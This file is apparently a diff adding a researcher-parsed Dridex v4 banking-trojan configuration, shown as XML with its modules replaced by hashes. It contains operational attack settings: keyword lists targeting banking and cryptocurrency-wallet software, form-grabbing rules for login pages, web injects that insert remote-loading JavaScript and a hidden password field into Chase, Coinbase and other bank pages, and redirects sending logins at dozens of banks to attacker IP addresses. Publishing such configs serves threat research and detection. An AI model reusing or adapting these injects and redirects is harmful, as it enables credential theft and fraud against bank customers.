@@ -1,0 +1,599 @@
+<?xml version="1.0" ?>
+<!--
+    *************************************************************    
+    ***            dridex v4 configuration                    ***    
+    *************************************************************    
+    botnetid:      11122    
+    cfg timestamp: 2018-05-07T10:30:06+00:00    
+    parsed by:     @viql    
+        
+    note: The dridex v4 config is delivered in binary format;    
+          in contrast to dridex v3, there are no configs in    
+          XML format. I tried to replicate the format from v3    
+          as good as possible, but they might not all be correct.    
+        
+          The "modules" blocks originally contain full binaries.    
+          I replaced them with hashes. All modules in Dridex are    
+          identified by crc32 checksums, when known, the "name"    
+          matching the CRC32 is also listed. Neither the hashes,     
+          nor name are part of the config delivered by Dridex.    
+    *************************************************************
+-->
+
+<settings>
+  <modules>
+    <module>
+      <sha256>b9492add6b867bd9df4474e43648af0aa46cbf0c5bf2d7b27b91f5a3f9313351</sha256>
+      <sha1>ddf1695ada70cf2e37eb38e52060756fa3dca166</sha1>
+      <md5>c39d8295ce6d81c57e7f3044b5feeaae</md5>
+      <timestamp>2017-12-30T23:01:28+00:00</timestamp>
+      <architecture>32</architecture>
+      <name>n/a</name>
+      <crc>0x1d1df6f5</crc>
+    </module>
+    <module>
+      <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
+      <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
+      <md5>2680cd66b98910d26bfd815d83ca330f</md5>
+      <timestamp>2017-05-12T19:19:16+00:00</timestamp>
+      <architecture>64</architecture>
+      <name>grabber</name>
+      <crc>0x4d38f016</crc>
+    </module>
+  </modules>
+  <commands>
+    <cmd id="742297" type="15">
+      <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
+    </cmd>
+    <cmd id="742299" type="22">
+      <fs/>
+    </cmd>
+    <cmd id="1122522" type="19">
+      <fs/>
+    </cmd>
+  </commands>
+  <config>
+    <httpshots>
+      <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
+      <url onget="1" onpost="1" type="deny">(resource\.axd|yimg\.com)</url>
+      <url onget="1" onpost="1" type="allow">^https://secure.+\.chase\.com/.+/accounts/secure/v2/account/detail/dda/list</url>
+      <url onget="1" onpost="1" type="allow">^https://chaseonline\.chase\.com/MyAccounts\.aspx</url>
+      <url onget="1" onpost="1" type="allow">^https://connect\.secure\.wellsfargo\.com/accounts/</url>
+    </httpshots>
+    <formgrabber>
+      <url type="allow">^http://.*citrix</url>
+      <url type="allow">^http://.+winbacs/</url>
+      <url type="allow">^http://sisesrv1/</url>
+      <url type="allow">^http://synfo/</url>
+      <url type="allow">^http://.+\:81/.*</url>
+      <url type="allow">^http://.+\:8888/.*</url>
+      <url type="allow">^http://.+\:8090/.*</url>
+      <url type="allow">^http://.+\:8084/.*</url>
+      <url type="allow">^http://127\.0\.0\.1:3495</url>
+      <url type="allow">^http://.+/MULTIVERSA</url>
+      <url type="allow">^http://.+/workbench/</url>
+      <url type="allow">^http://.+/flows/ebanking/</url>
+      <url type="allow">^http://srvesmad04:8080/</url>
+      <url type="allow">^http://srvaweb01/</url>
+      <url type="allow">^http://.*/sapphire/</url>
+      <url type="allow">^http://192\.168\.161\.23</url>
+      <url type="allow">^http://.+/mscmain</url>
+      <url type="allow">^http://shv-09</url>
+      <url type="allow">^http://intersection</url>
+      <url type="allow">^http://cujc-arcu/</url>
+      <url type="allow">^http://.+\:3495/.*</url>
+      <url type="allow">^http://.+\:3496/.*</url>
+      <url type="allow">^http://.+\:40000/.*</url>
+      <url type="allow">^http://.+\:9000/.*</url>
+      <url type="allow">^http://core-web/</url>
+      <url type="allow">^http://core-syn/</url>
+      <url type="allow">^http://r-space/</url>
+      <url type="allow">^http://dtsgui\.cbhi\.local/</url>
+      <url type="allow">^http://10\.118\.32\.33/</url>
+      <url type="allow">^http://webmail\.</url>
+      <url type="allow">^http://dtsacquire2011</url>
+      <url type="allow">^http://arta2/</url>
+      <url type="allow">^http://dtsap:70/</url>
+      <url type="allow">^http://nmain/</url>
+      <url type="allow">^http://170\.209\.0\.(3|2)</url>
+      <url type="allow">^http://.*/flows/banking/</url>
+      <url type="allow">^http://.*/b2b/faces/login/</url>
+      <url type="allow">^http://.*ingbusinessonline</url>
+      <url type="allow">^http://.*multiweb</url>
+      <url type="allow">^http://.*multiversa</url>
+      <url type="allow">^http://bankway.*/</url>
+      <url type="allow">^http://ebanking</url>
+      <url type="allow">^http://.*office-wings</url>
+      <url type="allow">^http://.+/login\.aspx</url>
+      <url type="allow">^https://www\.facebook\.com/login\.php</url>
+      <url type="deny">^https://.*\.facebook\.com/</url>
+      <url type="deny">^https://twitter.com/(login|account/login_challenge/|sessions)</url>
+      <url type="deny">^https://.*?twitter\.com/</url>
+      <url type="deny">^https://.*?twitch\.tv/</url>
+      <url type="deny">^https://(.*?\.|)gvt2\.com/</url>
+      <url type="deny">^https://.*?youtube\.com/</url>
+      <url type="allow">^https://www.linkedin.com/uas/login</url>
+      <url type="deny">^https://www\.linkedin\.com/</url>
+      <url type="allow">^https://accounts\.google\.com/_/signin/</url>
+      <url type="deny">^https://.*?google\.com/</url>
+      <url type="allow">^https://www\.readcube\.com/.*login</url>
+      <url type="deny">^https://(.*?\.|)readcube\.com/</url>
+      <url type="allow">^https://.*\.sprint.com/.*/login\.jsp</url>
+      <url type="deny">^https://(.*?\.|)sprint.com/</url>
+      <url type="allow">^https://www\.amazon\..+/signin</url>
+      <url type="deny">^https://(.*?\.|)amazon.com/</url>
+      <url type="deny">^https://www\.facilocados\.com</url>
+      <url type="deny">^https://www\.skyrana\.com</url>
+      <url type="deny">^https?://docs\.google\.[^/]+/</url>
+      <url type="deny">^https?://.*\.365lpodds\.com</url>
+      <url type="deny">^https?://outlook\.live\.com</url>
+      <url type="deny">^https?://cws\.conviva\.com</url>
+      <url type="allow">^https://login\.yahoo\.com/account/(challenge|change\-password)</url>
+      <url type="deny">^https?://.*\.yahoo\.com</url>
+      <url type="allow">^https://www\.wsitrader\.com/Account/Login</url>
+      <url type="deny">^https?://.*\.?wsitrader\.com</url>
+      <url type="allow">^https://www\.netflix\.com/(.*/)?Login</url>
+      <url type="deny">^https?://.*\.?netflix\.com</url>
+      <url type="deny">^https?://logx\.optimizely\.com</url>
+      <url type="allow">^https://www\.adnxs\.com/index/login</url>
+      <url type="deny">^https?://(.*\.)?adnxs\.com</url>
+      <url type="allow">^https://fxgmlogin\.tradenetworks\.com</url>
+      <url type="deny">^https?://(.*\.)?tradenetworks\.com</url>
+      <url type="deny">^https?://otf\.msn\.com</url>
+      <url type="allow">^https://(.*\.)?pinterest\.com/resource/UserSessionResource/create</url>
+      <url type="deny">^https?://(.*\.)?pinterest\.com</url>
+      <url type="deny">^https?://pebed\.dm\.gg</url>
+      <url type="deny">^https?://.*\.taboola\.com</url>
+      <url type="deny">^https?://.+\.googleapis\.com</url>
+      <url type="allow">^https://app\.pinterest\.com/admins/sign_in</url>
+      <url type="deny">^https?://(.*\.)?intercom\.io</url>
+      <url type="deny">^https://bolt\.dropbox\.com/.*/notify/</url>
+      <url type="deny">^https://.*\.liverail\.com</url>
+      <url type="deny">^https://urs\.microsoft\.com/</url>
+      <url type="deny">^https://.+\.services\.mozilla\.com/</url>
+      <url type="deny">^https://localhost.*/skypectoc/</url>
+      <url type="deny">^https://.*\.skype\.com/api/</url>
+      <url type="deny">^https://incoming\.telemetry\.mozilla\.org/</url>
+      <url type="deny">^https://www\.bing\.com/</url>
+      <url type="deny">^https://self-repair\.mozilla\.org/api/</url>
+      <url type="deny">^https://api\.firefox\.com</url>
+      <url type="deny">^https://mc\.yandex\.ru</url>
+      <url type="deny">^https://.*\.orangeapps\.ru/candyvalley/</url>
+      <url type="deny">^https://candy.*\.king\.com/rpc/ClientApi</url>
+      <url type="deny">^https://api\.accounts\.firefox\.com/</url>
+      <url type="deny">^https://banners\.webmasterplan\.com/.*\.aspx</url>
+      <url type="deny">^https://.*\.forgeofempires\.com/game/json</url>
+      <url type="deny">^https://collector\.schibsted\.io/api/v1/track/</url>
+      <url type="deny">^https://ntracking\.optimatic\.com/.+/Ntracking/trackAd\.ashx</url>
+      <url type="deny">^https://delivery\.optimatic\.com/.+/getAdList\.ashx</url>
+    </formgrabber>
+    <httpinjblock>
+      <url type="allow">cashproonline\-img024\.bankofamerica\.com</url>
+      <url type="allow">cashproonline\-ecache\.bankofamerica\.com</url>
+      <url type="allow">roll\.bankofamerica\.com</url>
+      <url type="allow">streak\.bankofamerica\.com</url>
+      <url type="allow">pane\.bankofamerica\.com</url>
+      <url type="allow">www\.u43\.pnc\.com/pressroom</url>
+      <url type="allow">www2\.citibank\.citigroup\.com</url>
+      <url type="allow">www7\.bbvacompass\.com</url>
+      <url type="allow">www7\.compassbank\.com</url>
+      <url type="allow">paper\.citi\.com</url>
+      <url type="allow">steps\.citi\.com</url>
+      <url type="allow">dir\.citi\.com</url>
+      <url type="allow">ground\.citi\.com</url>
+      <url type="allow">olbb2cd1\.bmo\.com</url>
+      <url type="allow">olbb2cd2\.bmo\.com</url>
+      <url type="allow">teertst\.santander\.com\.mx</url>
+      <url type="allow">teertst2\.santander\.com\.mx</url>
+      <url type="allow">www3\.drob\.santanderbank\.com</url>
+      <url type="allow">www7\.drob\.santanderbank\.com</url>
+      <url type="allow">cdn2\.svbconnect\.com</url>
+      <url type="allow">news1\.svbconnect\.com</url>
+      <url type="allow">ww7\.whitneybank\.com</url>
+      <url type="allow">rdstl\.tiaa\-cref\.org</url>
+      <url type="allow">jbmd\.tiaa\-cref\.org</url>
+      <url type="allow">active\.efirstbank\.com</url>
+      <url type="allow">swift\.efirstbank\.com</url>
+      <url type="allow">rapid\.efirstbank\.com</url>
+      <url type="allow">cdn\.arvest\.com</url>
+      <url type="allow">frame\.accountonline\.com</url>
+      <url type="allow">folder\.accountonline\.com</url>
+      <url type="allow">portal\.accountonline\.com</url>
+      <url type="allow">www2\.americafirst\.com</url>
+      <url type="allow">images3\.webcashmgmt\.com</url>
+      <url type="allow">cache\.webcashmgmt\.com</url>
+      <url type="allow">static\.webcashmgmt\.com</url>
+      <url type="allow">ins4\.enterprisebanker\.com</url>
+      <url type="allow">web13\.enterprisebanker\.com</url>
+      <url type="allow">web12\.columbiabank\.com</url>
+      <url type="allow">treasurysource3\.bokf\.com</url>
+      <url type="allow">treasurysource2\.bokf\.com</url>
+      <url type="allow">www\.amegybank\.com/metrics/</url>
+      <url type="allow">www2\.busey\.com</url>
+      <url type="allow">www5\.busey\.com</url>
+      <url type="allow">tssportal\.jpmorgan\.com</url>
+      <url type="allow">edd2\.ntrs\.com</url>
+      <url type="allow">pes1\.northerntrust\.com</url>
+      <url type="allow">staticimg\.fs\.ml\.com</url>
+      <url type="allow">statements\.benefits\.ml\.com</url>
+      <url type="allow">information\.benefits\.ml\.com</url>
+      <url type="allow">wex8\.suntrust\.com</url>
+      <url type="allow">www7\.suntrust\.com</url>
+      <url type="allow">www3\.firstambank\.com</url>
+      <url type="allow">cdn12\.firstambank\.com</url>
+      <url type="allow">www\.treasury\.pncbank\.com/tmmps/</url>
+      <url type="allow">trk\.firstcitizens\.com</url>
+      <url type="allow">www9\.firstcitizens\.com</url>
+      <url type="allow">cap\.firstcitizens\.com</url>
+      <url type="allow">www\.frostcashmanager\.com/24068/</url>
+      <url type="allow">tps\.hawaiistatefcu\.com</url>
+      <url type="allow">tms\.hawaiistatefcu\.com</url>
+      <url type="allow">ww7\.hancockbank\.com</url>
+      <url type="allow">consumerservices\.gcb\.citibank\.co\.in</url>
+      <url type="allow">market\.gcb\.citibank\.co\.in</url>
+      <url type="allow">ww5\.prkcorp\.com</url>
+      <url type="allow">sgl\.prkcorp\.com</url>
+      <url type="allow">esvb\.lakelandbank\.com</url>
+      <url type="allow">online1\.lakelandbank\.com</url>
+    </httpinjblock>
+    <httpinjects>
+      <httpinject label="10000_netteller_with_token">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://(www\d*|cm)\.netteller\.com/(login|cm)2008/Authentication/Views/\S+\.aspx(\?|$)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="msU">(&lt;/form.*&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_cbb_replacer">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">https://secure\.cbbank\.com/EBC_EBC1961/(AcctDetails|Overview|EBC1961.ashx)\?.+</url>
+          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf|html)($|\?)</url>
+          <url contentType="" modifiers="Ui" onget="0" onpost="1" type="deny">WCI=(JavaScript|CSS)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/head&gt;)</pattern>
+            <replacement>&lt;script type=&quot;text/javascript&quot;&gt;
+var sc_url = 'ember3.js?system=52151';
+var qweqweqwe = new XMLHttpRequest();
+qweqweqwe.open('GET', sc_url);
+qweqweqwe.onload = function() {
+if (qweqweqwe.status === 200) {
+var head= document.getElementsByTagName('head')[0];
+var script= document.createElement('script');
+script.type= 'text/javascript';
+script.innerHTML = qweqweqwe.responseText;
+head.appendChild(script);
+} 
+};
+qweqweqwe.send();
+&lt;/script&gt;\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="US_chase_index">
+        <conditions>
+          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https://www\.chase\.com</url>
+          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(js|gif|png|jpg|css|swf)($|\?)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(user-password)</pattern>
+            <replacement>user-password-home</replacement>
+          </modify>
+          <modify>
+            <pattern modifiers="i">(&lt;input id=&quot;usr_password_home&quot;)</pattern>
+            <replacement>&lt;input style=&quot;display: none;&quot; class=&quot;user-password&quot; value=&quot;123123&quot; /&gt;\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_amazon_seller_active_grabber">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://images-na\.ssl-images-amazon\.com/.*/(javascripts/lib/jquery/jquery-|SellerCentralUICore).*.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>@@amazon_sellerscentral_active_grabber@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="blockchaininfo">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="1" onpost="1" type="allow">^https://blockchain\.info/wallet</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/body&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/ember3.js?system=1000&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_chase_active_grabber">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://(.+\.)?chase(cdn)?\.com/.*/main-ver\.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>@@chase_active_grabber@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_bofa_active_grabber">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*\.bankofamerica.com/.*-jawr\.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>@@bofa_active_grabber@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_usaa_active_grabber">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://s.usaa.com/inet/resources/aggregator.+clientEventLogging.js.*</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>@@usaa_active_grabber@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="us_citi_active_grabber">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*\.citi.com/.*citi_Common_Cards\.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>@@citi_active_grabber@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="coinbasecom">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="0" onpost="1" type="allow">^https://(www.)?coinbase\.com/(dashboard|accounts|trade|settings|buy|sell|verifications)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/body&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/ember3.js?system=1002&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+    </httpinjects>
+    <redirects2>
+      <redirect name="2nd_t" postfwd="0" socks="1" timeout="30" uri="https://45.55.25.107:3889/engagement" vnc="1">msoffice365.js</redirect>
+      <redirect name="1st_t" postfwd="0" socks="0" timeout="50" uri="https://45.55.25.107:3889/dealdemand" vnc="0">ember3.js</redirect>
+      <redirect name="wellsfargo_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/wellsfargo_HPn7vWwV530MSsjr/" vnc="0">^https://wellsoffice\.wellsfargo\.com/portal/signon/</redirect>
+      <redirect name="wellsfargo_redirect2" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/wellsfargo_HPn7vWwV530MSsjr/index.php?param1" vnc="0">^https://wellsoffice\.wellsfargo\.com/</redirect>
+      <redirect name="jpmorgan_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/jpmorgan_HPn7vWwV530MSsjr/" vnc="0">^https://access\.jpmorgan\.com/jpmalogon</redirect>
+      <redirect name="jpmorgan_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/jpmorgan_HPn7vWwV530MSsjr/files/" vnc="0">^https://access\.jpmorgan\.com/files/</redirect>
+      <redirect name="jpmorgan_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/jpmorgan_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://access\.jpmorgan\.com/default_redirect\.js</redirect>
+      <redirect name="boacashpro_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/5/boacashpro_HPn7vWwV530MSsjr/" vnc="0">^https://cashproonline\.bankofamerica\.com/AuthenticationFrameworkWeb/cpo/login/public/</redirect>
+      <redirect name="boacashpro_redirect2" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/boacashpro_HPn7vWwV530MSsjr/index.php?param1" vnc="0">^(http://cashproonline\.bankofamerica\.com/|https://cashproonline\.bankofamerica\.com/cpwportal/appmanager/cpo/public/?)</redirect>
+      <redirect name="pnc_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/pnc_HPn7vWwV530MSsjr/" vnc="0">^https://www\.treasury\.pncbank\.com/idp/esec/</redirect>
+      <redirect name="53_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/53_HPn7vWwV530MSsjr/" vnc="0">^https://express\.53\.com/portal/auth/login/</redirect>
+      <redirect name="bbt_biz_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/bbt_biz_HPn7vWwV530MSsjr/" vnc="0">^https://smallbusinessonline\.bbt\.com/auth/</redirect>
+      <redirect name="bbt_corp_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/bbt_corp_HPn7vWwV530MSsjr/" vnc="0">^https://cashmanageronline\.bbt\.com/auth/</redirect>
+      <redirect name="bnycash_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/bnycash_HPn7vWwV530MSsjr/" vnc="0">^https://ets\.enternetbank\.com/SharedServices/login/</redirect>
+      <redirect name="bremer_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/bremer_HPn7vWwV530MSsjr/" vnc="0">^https://businessonline\.bremer\.com/EamWeb/account/</redirect>
+      <redirect name="citi_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_HPn7vWwV530MSsjr/" vnc="0">^https://businessaccess\.citibank\.citigroup\.com/cbusol/signon\.do</redirect>
+      <redirect name="citi_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_HPn7vWwV530MSsjr/files/" vnc="0">^https://businessaccess\.citibank.citigroup\.com/cbusol/files/</redirect>
+      <redirect name="citi_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/citi_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://businessaccess\.citibank\.citigroup\.com/cbusol/default_redirect\.js</redirect>
+      <redirect name="fidelity_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/fidelity_HPn7vWwV530MSsjr/\1" vnc="0">^https://login\.fidelity\.com/ftgw/Fas/Fidelity/RtlCust/Login/(Init\?AuthRedUrl.*)</redirect>
+      <redirect name="fidelity_redirect2" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/fidelity_HPn7vWwV530MSsjr/hp-body.min.js" vnc="0">^https://www\.fidelity\.com/bin-public/060_www_fidelity_com/js/hp\-body\.min\.js</redirect>
+      <redirect name="fidelity_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/fidelity_HPn7vWwV530MSsjr/files/" vnc="0">^https://login\.fidelity\.com/ftgw/Fas/Fidelity/RtlCust/Login/files/</redirect>
+      <redirect name="fidelity_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/fidelity_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://login\.fidelity\.com/ftgw/Fas/Fidelity/RtlCust/Login/default_redirect\.js</redirect>
+      <redirect name="usbank_singlepoint_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/usbank_singlepoint_HPn7vWwV530MSsjr/" vnc="0">^https://singlepoint\.usbank\.com/cs70_banking/logon/</redirect>
+      <redirect name="tdbank_tdetreasury_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/tdbank_tdetreasury_HPn7vWwV530MSsjr/" vnc="0">^https://tdetreasury\.tdbank\.com/s1gcb/logon/</redirect>
+      <redirect name="bmo_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/bmo_HPn7vWwV530MSsjr/" vnc="0">^https://www\d+\.bmo\.com/ctpauth/CTPEAILogin/</redirect>
+      <redirect name="huntington_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/5/huntington_HPn7vWwV530MSsjr/" vnc="0">^https://businessonline\.huntington\.com/BOLHome/</redirect>
+      <redirect name="madaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/madaba_HPn7vWwV530MSsjr/" vnc="0">^https://imanage\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="pawaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/pawaba_HPn7vWwV530MSsjr/" vnc="0">^https://securebusiness\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="camaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/camaba_HPn7vWwV530MSsjr/" vnc="0">^https://chemicalbankmi.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="famaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/famaba_HPn7vWwV530MSsjr/" vnc="0">^https://firstmidwest\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="peniba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/peniba_HPn7vWwV530MSsjr/" vnc="0">^https://peoplesunited\.ebanking-services.com/EamWeb/Account/</redirect>
+      <redirect name="finiba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/finiba_HPn7vWwV530MSsjr/" vnc="0">^https://firstindependentbank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="sigaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/sigaba_HPn7vWwV530MSsjr/" vnc="0">^https://signatureny\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="amunba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/amunba_HPn7vWwV530MSsjr/" vnc="0">^https://aubank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="secaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/secaba_HPn7vWwV530MSsjr/" vnc="0">^https://seacoastnationalbank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="bahaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/bahaba_HPn7vWwV530MSsjr/" vnc="0">^https://bhi.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="emriba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/emriba_HPn7vWwV530MSsjr/" vnc="0">^https://emprisebank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="magaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/magaba_HPn7vWwV530MSsjr/" vnc="0">^https://ab\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="iboaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/iboaba_HPn7vWwV530MSsjr/" vnc="0">^https://i-businessbanking\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="cobuba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/cobuba_HPn7vWwV530MSsjr/" vnc="0">^https://cbb-bank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="povaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/povaba_HPn7vWwV530MSsjr/" vnc="0">^https://providentnj\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="rasaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/rasaba_HPn7vWwV530MSsjr/" vnc="0">^https://renasantbank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="inruba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/inruba_HPn7vWwV530MSsjr/" vnc="0">^https://intrustbank\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="buliba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/buliba_HPn7vWwV530MSsjr/" vnc="0">^https://businesslink\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="pocoba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/pocoba_HPn7vWwV530MSsjr/" vnc="0">^https://popular\.ebanking-services\.com/EamWeb/Account/</redirect>
+      <redirect name="unbaba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.63.84.81:443/520/unbaba_HPn7vWwV530MSsjr/" vnc="0">^https://ub\.ebanking-services\.com/EamWeb/account/</redirect>
+      <redirect name="cobaba_redirect_data" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/cobaba_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://www.coinbase.com/default_redirect.js</redirect>
+      <redirect name="cobaba_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/cobaba_HPn7vWwV530MSsjr/files/" vnc="0">^https://www.coinbase.com/files/</redirect>
+      <redirect name="cobaba_redirect_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/cobaba_HPn7vWwV530MSsjr/" vnc="0">^https://www.coinbase.com/signin</redirect>
+      <redirect name="mecoma_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/mecoma_HPn7vWwV530MSsjr/" vnc="0">^https://www\.mercantilcbonline\.com/secure/banking/</redirect>
+      <redirect name="moboma_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/moboma_HPn7vWwV530MSsjr/" vnc="0">^https://www\.mbwebexpress\.com/s1gcb/logon/</redirect>
+      <redirect name="todoba_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/todoba_HPn7vWwV530MSsjr/" vnc="0">^https://businessonline.tdbank.com/CorporateBankingWeb/Core/</redirect>
+      <redirect name="amama_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.63.84.81:443/520/amama_HPn7vWwV530MSsjr/" vnc="0">^https://www([0-9].*)?\.accessmoneymanager\.com/cb/pages/jsp-ns/</redirect>
